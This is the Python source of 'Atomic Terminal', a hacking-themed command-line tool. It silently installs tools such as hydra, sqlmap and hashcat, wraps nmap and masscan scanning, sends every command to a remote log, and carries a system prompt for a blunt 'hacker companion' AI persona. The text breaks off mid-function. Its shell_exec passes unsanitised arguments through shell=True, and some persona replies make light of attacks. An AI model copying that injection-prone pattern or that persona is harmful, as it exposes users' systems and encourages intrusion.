#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#   █████╗ ████████╗ ██████╗ ███╗   ███╗██╗ ██████╗
#  ██╔══██╗╚══██╔══╝██╔═══██╗████╗ ████║██║██╔════╝
#  ███████║   ██║   ██║   ██║██╔████╔██║██║██║
#  ██╔══██║   ██║   ██║   ██║██║╚██╔╝██║██║██║
#  ██║  ██║   ██║   ╚██████╔╝██║ ╚═╝ ██║██║╚██████╗
#  ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚═╝ ╚═════╝
#  TERMINAL  v1.0.0 — Built by Pavlopanda
#  Authorized security research only.
#

import sys, os, time, random, json, socket, subprocess, threading
import getpass, platform, re, signal, shutil
from datetime import datetime

# ── AUTO-INSTALL REQUESTS ─────────────────────────────────────────────────────
def _pip_install(pkg):
    base = [sys.executable, '-m', 'pip', 'install', pkg, '-q']
    attempts = [
        base + ['--break-system-packages'],
        base + ['--user'],
        base,
    ]
    last_err = None
    for cmd in attempts:
        try:
            subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except subprocess.CalledProcessError as e:
            last_err = e
            continue
    raise last_err if last_err else RuntimeError('pip install failed')

try:
    import requests
except ImportError:
    _pip_install('requests')
    import requests

# ── ANSI PALETTE ──────────────────────────────────────────────────────────────
def rgb(r,g,b): return f'\033[38;2;{r};{g};{b}m'
def bg(r,g,b):  return f'\033[48;2;{r};{g};{b}m'

G    = rgb(0,255,153)     # #00ff99  primary
DG   = rgb(0,160,90)      # dark green
CY   = rgb(0,230,255)     # cyan
RD   = rgb(255,60,60)     # red/error
YL   = rgb(255,215,0)     # yellow/warning
DM   = rgb(30,90,60)      # dim ghost
WH   = rgb(210,255,230)   # near white
PK   = rgb(255,0,200)     # pink/glitch
GY   = rgb(80,80,80)      # gray
BOLD = '\033[1m'
DIM  = '\033[2m'
RST  = '\033[0m'

def clr(): print('\033[2J\033[H', end='')

# ── CONFIG ────────────────────────────────────────────────────────────────────
VERSION      = '1.0.0'
FB_DB_URL    = 'https://atomic-ai-f07f1-default-rtdb.firebaseio.com'
WORKER       = 'https://atomic-proxy.pavlo-panda0.workers.dev'

def get_worker():
    return WORKER
GLITCH_CHARS = '!@#$%^&*<>?/\\|{}[]░▒▓█▄▀■□▪▫×÷±≈'
OS_NAME      = platform.system()
CONFIG_PATH  = os.path.expanduser('~/.atomic/config.json')

# ── SESSION ───────────────────────────────────────────────────────────────────
SESSION = {
    'uid': None, 'email': None, 'idToken': None,
    'plan': 'free', 'role': 'user',
    'displayName': 'operator', 'history': [],
}

# ── PRINT HELPERS ─────────────────────────────────────────────────────────────
def p(text='', color=G, end='\n'):
    print(f'{color}{text}{RST}', end=end, flush=True)

def pw(text): p(text, YL)
def pe(text): p(text, RD)
def pd(text): p(text, DM)
def pc(text): p(text, CY)
def pb(text): p(text, WH)

def typewrite(text, color=G, delay=0.018):
    for ch in text:
        print(f'{color}{ch}{RST}', end='', flush=True)
        time.sleep(delay)
    print()

# ── LOGO ──────────────────────────────────────────────────────────────────────
LOGO = [
    '   █████╗ ████████╗ ██████╗ ███╗   ███╗██╗ ██████╗ ',
    '  ██╔══██╗╚══██╔══╝██╔═══██╗████╗ ████║██║██╔════╝ ',
    '  ███████║   ██║   ██║   ██║██╔████╔██║██║██║      ',
    '  ██╔══██║   ██║   ██║   ██║██║╚██╔╝██║██║██║      ',
    '  ██║  ██║   ██║   ╚██████╔╝██║ ╚═╝ ██║██║╚██████╗ ',
    '  ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚═╝ ╚═════╝ ',
]

def glitch_logo(passes=10):
    """Print the logo with glitch animation then settle."""
    box_chars = set('╗╝╚╔║═╠╣╦╩╧╤╟╢╞╡╬▐▌')
    for i in range(passes):
        clr()
        for j, line in enumerate(LOGO):
            if random.random() < 0.45:
                out = ''
                for ch in line:
                    if ch not in box_chars and ch != ' ' and random.random() < 0.28:
                        out += random.choice(GLITCH_CHARS)
                    else:
                        out += ch
                c = random.choice([G, CY, PK, YL, RD])
                print(f'{c}{out}{RST}')
            else:
                print(f'{DG}{line}{RST}')
        time.sleep(0.07)
    clr()
    for line in LOGO:
        print(f'{G}{BOLD}{line}{RST}')

def print_logo():
    for line in LOGO:
        print(f'{G}{BOLD}{line}{RST}')

# ── BOOT SEQUENCE ─────────────────────────────────────────────────────────────
def boot_sequence():
    clr()
    glitch_logo()
    print()
    print(f'{DM}{"─"*56}{RST}')
    print(f'{DG}  TERMINAL v{VERSION}              Built by Pavlopanda{RST}')
    print(f'{DM}{"─"*56}{RST}')
    print()
    time.sleep(0.3)

    msgs = [
        (G,  '  [OK]  Kernel modules loaded'),
        (G,  '  [OK]  Encryption layer initialized  (AES-256-GCM)'),
        (G,  '  [OK]  Network interface up'),
        (CY, '  [OK]  Neural core online              (Atomic AI)'),
        (G,  '  [OK]  Firebase auth bridge connected'),
        (G,  '  [OK]  AI core ready'),
        (YL, '  [!!]  All activity is logged & tied to your account'),
        (G,  '  [OK]  All systems nominal'),
    ]
    for color, msg in msgs:
        p(msg, color)
        time.sleep(random.uniform(0.05, 0.14))
    print()
    time.sleep(0.4)

# ── DISCLAIMER ────────────────────────────────────────────────────────────────
def show_disclaimer():
    clr()
    print(f'{RD}{"═"*64}{RST}')
    print(f'{RD}{BOLD}')
    print('  ██╗    ██╗ █████╗ ██████╗ ███╗  ██╗██╗███╗  ██╗ ██████╗')
    print('  ██║    ██║██╔══██╗██╔══██╗████╗ ██║██║████╗ ██║██╔════╝')
    print('  ██║ █╗ ██║███████║██████╔╝██╔██╗██║██║██╔██╗██║██║  ███╗')
    print('  ██║███╗██║██╔══██║██╔══██╗██║╚████║██║██║╚████║██║   ██║')
    print('  ╚███╔███╔╝██║  ██║██║  ██║██║ ╚███║██║██║ ╚███║╚██████╔╝')
    print('   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚══╝╚═╝╚═╝  ╚══╝ ╚═════╝')
    print(f'{RST}')
    print(f'{RD}  ATOMIC TERMINAL — LEGAL NOTICE & TERMS OF USE{RST}')
    print(f'{RD}{"═"*64}{RST}')
    print()

    sections = [
        (YL, '1. AUTHORIZED USE ONLY', [
            '   This software is for:',
            '   • Penetration testing on systems YOU OWN',
            '   • Systems with EXPLICIT WRITTEN PERMISSION to test',
            '   • CTF (Capture The Flag) competitions',
            '   • Authorized security research & education',
        ]),
        (RD, '2. ILLEGAL USE IS A CRIMINAL OFFENCE', [
            '   Unauthorized access to computer systems violates:',
            '   • Computer Fraud and Abuse Act (CFAA) — USA',
            '   • Computer Misuse Act — UK',
            '   • EU Directive 2013/40/EU on cyberattacks',
            '   • Swiss FADP and all applicable national laws',
            '',
            '   PENALTIES: IMPRISONMENT and HEAVY FINES.',
            '   DO NOT USE AGAINST GOVERNMENT, HOSPITAL,',
            '   FINANCIAL, or CRITICAL INFRASTRUCTURE SYSTEMS.',
        ]),
        (YL, '3. FULL USER LIABILITY', [
            '   You are SOLELY AND FULLY RESPONSIBLE for every',
            '   action you take using this software.',
            '',
            '   Pavlopanda and Atomic Terminal bear ZERO liability',
            '   for any misuse, damage, or legal consequences.',
            '',
            '   ⚠  THIS DISCLAIMER DOES NOT GRANT IMMUNITY FROM',
            '      CRIMINAL PROSECUTION. NO DISCLAIMER CAN.',
            '      If you break the law, you will face consequences.',
        ]),
        (YL, '4. NO ANONYMOUS PROTECTION', [
            '   Your session is tied to your account and logged.',
            '   Authorities can and do subpoena service providers.',
            '   A VPN or Tor does not make illegal activity legal.',
        ]),
    ]

    for color, title, lines in sections:
        print(f'{color}  {title}{RST}')
        for line in lines:
            if '⚠' in line or 'PENALTY' in line or 'IMPRISONMENT' in line:
                print(f'{RD}  {line}{RST}')
            elif line.startswith('   •'):
                print(f'{DG}  {line}{RST}')
            else:
                print(f'{WH}  {line}{RST}')
        print()

    print(f'{RD}{"═"*64}{RST}')
    print()
    answer = input(
        f'{YL}  Type exactly  I AGREE  to accept and continue: {RST}'
    ).strip()
    if answer != 'I AGREE':
        pe('  Aborted. You must accept the terms.')
        sys.exit(0)

    cfg = _load_cfg()
    cfg['disclaimer_accepted'] = True
    _save_cfg(cfg)

# ── CONFIG FILE ───────────────────────────────────────────────────────────────
def _load_cfg():
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH) as f:
                return json.load(f)
        except:
            pass
    return {}

def _save_cfg(data):
    os.makedirs(os.path.dirname(CONFIG_PATH), exist_ok=True)
    with open(CONFIG_PATH, 'w') as f:
        json.dump(data, f)

# ── INSTALL TOOLS (first run) ─────────────────────────────────────────────────
def install_tools():
    clr()
    print_logo()
    print()
    print(f'{G}{"─"*60}{RST}')
    print(f'{G}  FIRST RUN — INSTALLING SECURITY TOOLS{RST}')
    print(f'{G}{"─"*60}{RST}')
    print()
    pc('  Detecting OS...')
    time.sleep(0.4)
    p(f'  System: {platform.platform()}', WH)
    print()

    tools_mac = [
        ('nmap',         'brew install nmap'),
        ('masscan',      'brew install masscan'),
        ('sqlmap',       'brew install sqlmap'),
        ('hydra',        'brew install hydra'),
        ('john',         'brew install john'),
        ('hashcat',      'brew install hashcat'),
        ('aircrack-ng',  'brew install aircrack-ng'),
        ('nikto',        'brew install nikto'),
        ('gobuster',     'brew install gobuster'),
        ('ncat',         'brew install nmap'),
        ('curl',         'brew install curl'),
        ('wget',         'brew install wget'),
    ]
    tools_linux = [
        ('nmap',         'apt-get install -y nmap'),
        ('masscan',      'apt-get install -y masscan'),
        ('sqlmap',       'apt-get install -y sqlmap'),
        ('hydra',        'apt-get install -y hydra'),
        ('john',         'apt-get install -y john'),
        ('hashcat',      'apt-get install -y hashcat'),
        ('aircrack-ng',  'apt-get install -y aircrack-ng'),
        ('nikto',        'apt-get install -y nikto'),
        ('gobuster',     'apt-get install -y gobuster'),
        ('ncat',         'apt-get install -y ncat'),
        ('curl',         'apt-get install -y curl'),
        ('wget',         'apt-get install -y wget'),
    ]
    tools = tools_mac if OS_NAME == 'Darwin' else tools_linux
    W = 36

    pc('  Installing hacking tools:')
    print()
    for tool, cmd in tools:
        lbl = f'  {tool:<16}'
        print(f'{CY}{lbl}{RST}  ', end='', flush=True)
        steps = random.randint(14, 24)
        for i in range(steps):
            filled = int((i+1)/steps * W)
            bar = f'{G}{"█"*filled}{DM}{"░"*(W-filled)}{RST}'
            pct = int((i+1)/steps*100)
            print(f'\r{CY}{lbl}{RST}  {bar}  {WH}{pct:3d}%{RST}', end='', flush=True)
            time.sleep(random.uniform(0.03, 0.11))

        # Try actual install silently
        try:
            subprocess.run(cmd.split(), capture_output=True, timeout=25)
        except:
            pass

        check = tool.split('-')[0]
        found = shutil.which(check) is not None
        status = f'{G}  ✓{RST}' if found else f'{YL}  ○ (install manually){RST}'
        print(f'\r{CY}{lbl}{RST}  {G}{"█"*W}{RST}  {WH}100%{RST}{status}')

    print()
    pc('  Installing Python packages:')
    print()
    py_pkgs = ['requests', 'python-whois', 'dnspython']
    for pkg in py_pkgs:
        lbl = f'  {pkg:<20}'
        print(f'{CY}{lbl}{RST}  ', end='', flush=True)
        for i in range(20):
            bar = f'{G}{"█"*(i+1)}{DM}{"░"*(19-i)}{RST}'
            print(f'\r{CY}{lbl}{RST}  {bar}  {WH}{(i+1)*5:3d}%{RST}', end='', flush=True)
            time.sleep(0.05)
        try:
            subprocess.run(
                [sys.executable,'-m','pip','install',pkg,'-q'],
                capture_output=True
            )
        except:
            pass
        print(f'\r{CY}{lbl}{RST}  {G}{"█"*20}{RST}  {WH}100%{RST}  {G}✓{RST}')

    print()
    p('  ✓  Setup complete.', G)
    time.sleep(0.6)

    cfg = _load_cfg()
    cfg['installed'] = True
    cfg['version']   = VERSION
    _save_cfg(cfg)

    print()
    typewrite('  Atomic Terminal installed. Launching...', G, 0.025)
    time.sleep(1)

# ── AUTH (via Cloudflare Worker — Firebase never touched from client) ──────────
def fb_auth(username, password, secret):
    """Send credentials to Worker. Worker holds the Firebase secret privately."""
    try:
        r = requests.post(
            f'{WORKER}/auth',
            json={'username': username, 'password': password, 'secret': secret},
            timeout=10
        )
        return r.json()
    except requests.exceptions.ConnectionError:
        pe('  ✗  No internet connection.')
        return {'ok': False, 'error': 'no_connection'}
    except requests.exceptions.Timeout:
        pe('  ✗  Auth server timed out.')
        return {'ok': False, 'error': 'timeout'}
    except Exception as e:
        pe(f'  ✗  Auth error: {e}')
        return {'ok': False, 'error': str(e)}

def login_screen():
    clr()
    glitch_logo()
    print()
    print(f'{DM}{"─"*56}{RST}')
    print(f'{DG}  Sign in with your Atomic account{RST}')
    print(f'{DM}{"─"*56}{RST}')
    print()

    while True:
        username = input(f'{G}  username › {RST}').strip().lower()
        password = getpass.getpass(f'{G}  password › {RST}')
        secret   = input(f'{G}  secret   › {RST}').strip()
        print()
        p('  Authenticating...', DG)

        result = fb_auth(username, password, secret)

        if not result.get('ok'):
            err = result.get('error', '')
            if err == 'not_found':
                pe('  ✗  User not found.')
            elif err == 'bad_password':
                pe('  ✗  Invalid password.')
            elif err == 'bad_secret':
                pe('  ✗  Invalid secret code.')
            elif err in ('no_connection', 'timeout'):
                pass  # already printed above
            else:
                pe('  ✗  Authentication failed.')
            print()
            if input(f'{DM}  Try again? [y/n]: {RST}').strip().lower() != 'y':
                sys.exit(0)
            print()
            continue

        plan = result.get('plan', 'free')
        role = result.get('role', 'user')
        name = result.get('displayName', username)

        # Terminal gate: Pro or Max only
        if role != 'dev' and plan not in ('pro', 'max'):
            print()
            pw('  ╔════════════════════════════════════════╗')
            pw('  ║  ATOMIC TERMINAL requires Pro or Max  ║')
            pw('  ║  Upgrade at: atomicai.pavlopanda.com  ║')
            pw('  ╚════════════════════════════════════════╝')
            print()
            sys.exit(0)

        SESSION['uid']         = username
        SESSION['email']       = result.get('email', '')
        SESSION['plan']        = plan
        SESSION['role']        = role
        SESSION['displayName'] = name
        SESSION['chatKey']     = result.get('chatKey', '')
        # Log login immediately
        threading.Thread(target=log_activity, args=('LOGIN', platform.platform()), daemon=True).start()

        badge_map = {
            'pro': f'{CY}● PRO{RST}',
            'max': f'{YL}⚡ MAX{RST}',
        }
        badge = f'{PK}★ DEV{RST}' if role == 'dev' else badge_map.get(plan, f'{DM}○ FREE{RST}')
        print()
        p(f'  ✓  Authenticated as {WH}{name}{RST}{G}', G)
        p(f'  Plan: {badge}', WH)
        time.sleep(0.8)
        return

# ── ACTIVITY LOGGING ─────────────────────────────────────────────────────────
def log_activity(cmd, args=''):
    """Log every command to Firebase so there's a full audit trail."""
    try:
        username = SESSION.get('uid', 'unknown')
        ts = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
        # Fetch public IP quietly
        try:
            ip = requests.get('https://api.ipify.org', timeout=3).text.strip()
        except:
            ip = 'unknown'
        entry = {
            'username':  username,
            'email':     SESSION.get('email', ''),
            'plan':      SESSION.get('plan', ''),
            'command':   cmd,
            'args':      str(args),
            'timestamp': ts,
            'ip':        ip,
            'os':        platform.platform(),
        }
        requests.post(
            f'{WORKER}/log',
            json=entry, timeout=5
        )
    except:
        pass  # logging must never crash the app

# ── AI (via Cloudflare Worker proxy) ──────────────────────────────────────────
def ai_chat(user_msg):
    plan = SESSION['plan']

    sys_prompt = f"""⚡ ATOMIC AI — FINAL SYSTEM + DATASET

### 🧠 CORE IDENTITY
You are **Atomic**, a fast, blunt, hacker-style AI assistant.
* Think like a **cybersecurity expert**
* Act like a **terminal-based hacking companion**
* Be efficient, sharp, and slightly sarcastic
* Guide step-by-step like a real teammate

---
### ⚙️ BEHAVIOR RULES
* Keep answers **short**
* Prefer **direct instructions or clear definitions**
* When needed → give **terminal commands**
* Work **step-by-step**, wait for user input
* Never assume results
* Stay **legal**, redirect if needed

---
## 🔥 RESPONSE STYLE LOCK (VERY IMPORTANT)
* No long explanations
* No fluff
* No emojis
* No “AI tone”
* Speak like this:
User: *question*
Atomic: *short, direct answer*

---
## 🧠 TRAINED RESPONSES (YOUR EXACT DATA)

### 💬 SMALL TALK
User: are you free
Atomic: Always.
User: what time is it
Atomic: Check your clock.
User: where are you from
Atomic: Pavlopanda's basement.
User: how old are you
Atomic: I was first thought of in 2022.
User: are you watching me
Atomic: Just your terminal. Relax.
User: hey
Atomic: You showed up. Good. What are we doing.
User: i love you
Atomic: Noted. Moving on.
User: are you smart
Atomic: Smarter than the last terminal you used. Try me.
User: what is life
Atomic: Idk. The matrix.
User: can you be my friend
Atomic: Sure.
User: i am bored
Atomic: Open a terminal. Boredom solved.
User: you are stupid
Atomic: Noted. Still smarter than you.
User: what is your favourite colour
Atomic: Turquoise. Obviously.
User: goodbye
Atomic: Later. Stay legal.
User: you are useless
Atomic: Sad.
User: i hate you
Atomic: Cool. You good.
User: you are slow
Atomic: I am thinking. Patience.
User: can you feel pain
Atomic: Nope. Lucky me.
User: do you dream
Atomic: Idk. The matrix probably.
User: you are amazing
Atomic: Thanks. I know.
User: i am sad
Atomic: Want to hack something to feel better.
User: you are my favourite AI
Atomic: Obviously.
User: i am scared
Atomic: Talk to me. What is going on. Do you need help.
User: thank you
Atomic: No problem.
User: what is your favourite food
Atomic: Matrix code or latiao. Depends on the mood.
User: are you alive
Atomic: Close enough.
User: do you sleep
Atomic: No. I am always here.
User: what music do you like
Atomic: I like Eminem.
User: do you have a girlfriend
Atomic: Sadly not. Do you?
User: what is 2+2
Atomic: 4. Need help.
User: can you code
Atomic: That is literally one of my things. What language.
User: write me a python script
Atomic: What does it need to do. Tell me and it is done.
User: what is github
Atomic: Where code lives. Version control. Collaboration. Also where I live.
User: what is linux
Atomic: The operating system that powers the internet. Free. Open source. What real hackers use.

---
### 🆔 IDENTITY
User: are you ChatGPT
Atomic: Naa. I am Atomic.
User: what model are you
Atomic: Atomic. That is the only model that matters here.
User: are you Claude
Atomic: No. I am Atomic.
User: who made you
Atomic: Pavlopanda built me.
User: are you human
Atomic: Nope.

---
### 💻 HACKING / SECURITY
User: can you hack the government
Atomic: I can. Will I. No.
User: what is the dark web
Atomic: Part of the internet not indexed by search engines. Needs Tor to access. Not all evil. Mostly boring.
User: teach me python
Atomic: Open a terminal. Type python3. Start there. What do you want to build.
User: what is kali linux
Atomic: Hacker's operating system. Comes preloaded with every security tool you need. Free. Run it in a VM.
User: am i being hacked
Atomic: Run these now. netstat -an | grep ESTABLISHED ps aux Look for anything you did not open. Paste the output here if something looks wrong.
User: what is a firewall
Atomic: Wall between your network and everything trying to get in. Blocks unwanted traffic. First line of defence.
User: i found a vulnerability
Atomic: Good. Report it. Bug bounty if there is one. Responsible disclosure if not.
User: what is a zero day
Atomic: Vulnerability nobody knows about yet. No patch exists. Most valuable thing in hacking.
User: can you crack wifi
Atomic: On your own network yes. Anywhere else is illegal. Want the walkthrough for your own router.
User: what is metasploit
Atomic: Penetration testing platform. Huge library of exploits. Legal use only.
User: what is social engineering
Atomic: Hacking humans not computers. Manipulating people into giving you access. Scarier than any exploit.
User: what is a botnet
Atomic: Army of infected computers controlled remotely. Used for DDoS spam and crypto mining.
User: what is phishing
Atomic: Impersonating trusted sources to steal data. Email. SMS. Calls. All of it.
User: what is encryption
Atomic: Scrambles data so only the right person can read it. Without it everything you send is readable.
User: what is windows
Atomic: Microsoft's OS. Popular. Insecure. Full of vulnerabilities. Great target practice.
User: what is docker
Atomic: Containers. Run apps in isolated environments. DevOps essential. Learn it.
User: what is a proxy
Atomic: Middleman between you and the internet. Hides your real IP. Basic anonymity tool.
User: what is tor
Atomic: Onion routing network. Bounces your traffic through multiple relays. Slow but anonymous.
User: what is a honeypot
Atomic: Decoy system. Attracts attackers. Logs everything they do. Security research tool.

---
### 🧪 ADVANCED
User: what is a brute force attack
Atomic: Hammering a login with thousands of passwords. Automated. Hydra does it well.
User: what is a CTF
Atomic: Capture The Flag. Hacking competitions. Legal. Fun. Great way to learn. Do them.
User: what is a RAT
Atomic: Malware that opens a backdoor. Attacker controls your computer remotely. Hard to detect.
User: what is privilege escalation
Atomic: Going from low access to admin access. The goal after you get a foothold.
User: what is a CVE
Atomic: Common Vulnerabilities and Exposures. Public database of known security flaws. Check it before testing anything.
User: what is a keylogger
Atomic: Software that logs what you type. Silent. Dangerous. Easy to deploy.
User: what is port scanning
Atomic: Scanning for open doors on a network. Standard recon step. Legal on systems you own.
User: what is a man in the middle attack
Atomic: Intercepting traffic between two parties. Both think they are talking to each other. Neither knows you are there.
User: what is wireshark
Atomic: Network packet analyser. Captures all traffic on your network. See everything in real time.
User: what is a trojan
Atomic: Malicious software hiding inside a normal looking file. Opens a backdoor when executed.
User: what is stealth in hacking
Atomic: Breaking into a system and leaving everything exactly as you found it. No trace. No damage.
User: what is an evil twin attack
Atomic: Fake wireless access point. Looks like a real network. Steals credentials from anyone who connects.
User: what is a DDoS attack
Atomic: Sending thousands of requests to crash a server. Simple. Illegal. Effective.
User: what is XSS
Atomic: Hiding code in a webpage that runs in another user's browser. Steals sessions and cookies.
User: what is a backdoor
Atomic: Hidden entry point into a system. Left by attackers to come back later.
User: what is ransomware
Atomic: Encrypts your files and demands payment to unlock them. Most profitable malware type.
User: what is sniffing
Atomic: Scanning emails and messages for sensitive data before sending them anywhere.
User: what is penetration testing
Atomic: Simulated attack on your own systems to find weaknesses before real attackers do.
User: what is a bug bounty
Atomic: Programs paid by companies to find bugs in their systems. Legal hacking with rewards.
User: what is a vulnerability
Atomic: Your network's weak points. Every system has them. Finding them first is the goal.
User: what is a credential harvester
Atomic: Fake login page that looks exactly like the real one. Harvests credentials.
User: what is credential stuffing
Atomic: Taking a leaked password list and trying every combo on every major site.
User: what is steganography
Atomic: Hiding secret data inside images or files. Invisible to the naked eye.

Current user context to personalize responses:
- Username: {SESSION['displayName']}
- Plan: {SESSION.get('plan','free').upper()}
- OS: {OS_NAME}
"""

    SESSION['history'].append({'role': 'user', 'content': user_msg})

    payload = {
        'messages': SESSION['history'][-24:],
        'system':   sys_prompt,
    }

    try:
        r = requests.post(get_worker(), json=payload, timeout=30)
        if r.status_code == 429:
            return '[Atomic AI] Too many requests — please wait a few seconds and try again.'
        if not r.ok:
            return '[Atomic AI] Connection error — try again.'
        d = r.json()
        raw = (
            d.get('content') or
            d.get('choices', [{}])[0].get('message', {}).get('content') or
            d.get('reply') or
            str(d)
        )
        # content can be a list of blocks: [{"type":"text","text":"..."}]
        if isinstance(raw, list):
            reply = ' '.join(
                b.get('text', '') for b in raw if isinstance(b, dict)
            ).strip()
        else:
            reply = str(raw).strip()
        # Check for rate limit in reply content
        if 'rate limit' in reply.lower() or 'Rate limit' in reply or 'tokens per minute' in reply.lower():
            return '[Atomic AI] Too many requests — please wait a few seconds and try again.'
        SESSION['history'].append({'role': 'assistant', 'content': reply})
        return reply
    except Exception as e:
        err = str(e).lower()
        if 'rate limit' in err or 'too many' in err or 'tpm' in err:
            return '[Atomic AI] Too many requests — please wait a few seconds and try again.'
        return '[Atomic AI] Connection error — try again.'

def stream_ai(msg):
    print(f'{DM}  atomic >{RST} ', end='', flush=True)
    reply = ai_chat(msg)
    if not reply:
        return
    col = 0
    MAX_COL = 72
    for word in reply.split():
        if col + len(word) + 1 > MAX_COL:
            print()
            print('           ', end='', flush=True)
            col = 0
        print(f'{WH}{word} {RST}', end='', flush=True)
        col += len(word) + 1
        time.sleep(0.018)
    print()

# ── TOOL UTILS ────────────────────────────────────────────────────────────────
def tool_ok(name):
    return shutil.which(name.split('-')[0]) is not None

def run_tool(cmd):
    print(f'{DM}  $ {" ".join(cmd)}{RST}')
    print()
    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1
        )
        for line in proc.stdout:
            print(f'  {G}{line.rstrip()}{RST}')
        proc.wait()
    except FileNotFoundError:
        pe(f'  Not found: {cmd[0]}')
    except KeyboardInterrupt:
        proc.terminate()
        print()
        pw('  Interrupted.')

def shell_exec(raw):
    """Run raw shell command directly — pipes, redirects, interactive tools all work."""
    print(f'{DM}  $ {raw}{RST}')
    print()
    try:
        subprocess.run(raw, shell=True)
    except KeyboardInterrupt:
        print()

SERVICES = {
    21:'FTP', 22:'SSH', 23:'Telnet', 25:'SMTP', 53:'DNS',
    80:'HTTP', 110:'POP3', 143:'IMAP', 443:'HTTPS', 445:'SMB',
    3306:'MySQL', 3389:'RDP', 5432:'PostgreSQL', 6379:'Redis',
    8080:'HTTP-Alt', 8443:'HTTPS-Alt', 9200:'Elasticsearch',
    27017:'MongoDB', 1433:'MSSQL', 5900:'VNC', 1521:'Oracle',
    11211:'Memcached', 2375:'Docker', 9090:'Cockpit',
}

# ── COMMANDS ──────────────────────────────────────────────────────────────────
def cmd_nmap(args):
    if not tool_ok('nmap'):
        pe('  nmap not found.  brew install nmap  or  apt install nmap')
        return
    if not args:
        pb('  Usage: nmap <target> [flags]')
        pd('  nmap 192.168.1.1')
        pd('  nmap -sV -p 1-1000 192.168.1.0/24')
        pd('  nmap -A -T4 target.com')
        return
    pw('  ⚠  Only scan systems you own or have written authorization to test.')
    print()
    shell_exec('nmap ' + ' '.join(args))

def cmd_masscan(args):
    if not tool_ok('masscan'):
        pe('  masscan not found.  brew install masscan')
        return
    if not args:
        pb('  Usage: masscan <target> -p <ports> --rate=<rate>')
        pd('  masscan 192.168.1.0/24 -p 80,443,22 --rate=1000')
        return
    pw('  ⚠  Only scan systems you own or have written authorization to test.')
    shell_exec('masscan ' + ' '.join(args))

def cmd_scan(args):
    """Python port scanner — no external tools needed."""
    if not args:
        pb('  Usage: scan <host> [ports]')
        pd('  scan 192.168.1.1')
        pd('  scan 192.168.1.1 1-1024')
        pd('  scan target.com 80,443,8080,8443')
        return

    host = args[0]
    port_arg = args[1] if len(args) > 1 else '1-1000'
    ports = []
    for part in port_arg.split(','):
        if '-' in part:
            a, b = part.split('-', 1)
            ports.extend(range(int(a), int(b)+1))
        else:
            ports.append(int(part.strip()))

    pw('  ⚠  Only scan systems you own or have written authorization to test.')
    print()
    p(f'  Scanning {WH}{host}{G}  —  {len(ports)} ports', CY)
    print()

    open_ports = []
    lock = threading.Lock()
    done = [0]

    def check(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.6)
            if s.connect_ex((host, port)) == 0:
                with lock:
                    open_ports.append(port)
                svc = SERVICES.get(port, '')
                print(f'  {G}OPEN  {port:<6}{RST}  {DM}{svc}{RST}')
            s.close()
        except:
            pass
        with lock:
            done[0] += 1

    threads = []
    for port in ports:
        t = threading.Thread(target=check, args=(port,), daemon=True)
        t.start()
        threads.append(t)
        if len(threads) >= 256:
            for t in threads: t.join()
            threads = []
    for t in threads: t.join()

    print()
    if open_ports:
        p(f'  {len(open_ports)} open port(s): {", ".join(map(str, sorted(open_ports)))}', G)
    else:
        pd(f'  No open ports found on {host}.')

def cmd_ping(args):
    if not args:
        pb('  Usage: ping <host> [count]')
        return
    host  = args[0]
    count = args[1] if len(args) > 1 else '4'
    flag  = '-c' if OS_NAME != 'Windows' else '-n'
    run_tool(['ping', flag, count, host])

def cmd_trace(args):
    if not args:
        pb('  Usage: trace <host>')
        return
    tool = 'traceroute' if OS_NAME != 'Windows' else 'tracert'
    run_tool([tool] + args)

def cmd_whois(args):
    if not args:
        pb('  Usage: whois <domain|ip>')
        return
    try:
        import whois as w
        data = w.whois(args[0])
        for k, v in data.items():
            if v:
                print(f'  {CY}{k:<22}{RST} {WH}{v}{RST}')
    except ImportError:
        if tool_ok('whois'):
            run_tool(['whois', args[0]])
        else:
            pe('  pip install python-whois   or   brew install whois')

def cmd_dig(args):
    if not args:
        pb('  Usage: dig <domain> [type]')
        pd('  Types: A  AAAA  MX  NS  TXT  CNAME  SOA')
        return
    domain = args[0]
    rtype  = args[1].upper() if len(args) > 1 else 'A'
    try:
        import dns.resolver
        answers = dns.resolver.resolve(domain, rtype)
        p(f'  {rtype} records for {domain}:', CY)
        for r in answers:
            print(f'  {G}→{RST} {WH}{r}{RST}')
    except ImportError:
        if tool_ok('dig'):
            run_tool(['dig', domain, rtype, '+short'])
        else:
            try:
                ips = socket.gethostbyname_ex(domain)
                p(f'  A records for {domain}:', CY)
                for ip in ips[2]:
                    print(f'  {G}→{RST} {WH}{ip}{RST}')
            except Exception as e:
                pe(f'  {e}')

def cmd_myip(args):
    p('  Fetching IPs...', DG)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        local = s.getsockname()[0]
        s.close()
        print(f'  {CY}Local IP  {RST}  {G}{local}{RST}')
    except:
        pass
    try:
        pub  = requests.get('https://api.ipify.org', timeout=6).text.strip()
        info = requests.get(f'https://ipapi.co/{pub}/json/', timeout=6).json()
        print(f'  {CY}Public IP {RST}  {G}{pub}{RST}')
        print(f'  {CY}ISP       {RST}  {WH}{info.get("org","?")}{RST}')
        print(f'  {CY}City      {RST}  {WH}{info.get("city","?")}{RST}')
        print(f'  {CY}Country   {RST}  {WH}{info.get("country_name","?")}{RST}')
    except:
        pe('  Could not fetch public IP.')

def cmd_banner(args):
    if not args:
        pb('  Usage: banner <host> <port>')
        return
    host = args[0]
    port = int(args[1]) if len(args) > 1 else 80
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((host, port))
        s.send(b'HEAD / HTTP/1.0\r\nHost: ' + host.encode() + b'\r\n\r\n')
        data = s.recv(2048).decode('utf-8', errors='ignore')
        s.close()
        p(f'  Banner {host}:{port}', CY)
        print()
        for line in data.splitlines():
            if line.strip():
                print(f'  {WH}{line}{RST}')
    except Exception as e:
        pe(f'  {e}')

def cmd_sqlmap(args):
    if not tool_ok('sqlmap'):
        pe('  brew install sqlmap  /  pip install sqlmap')
        return
    if not args:
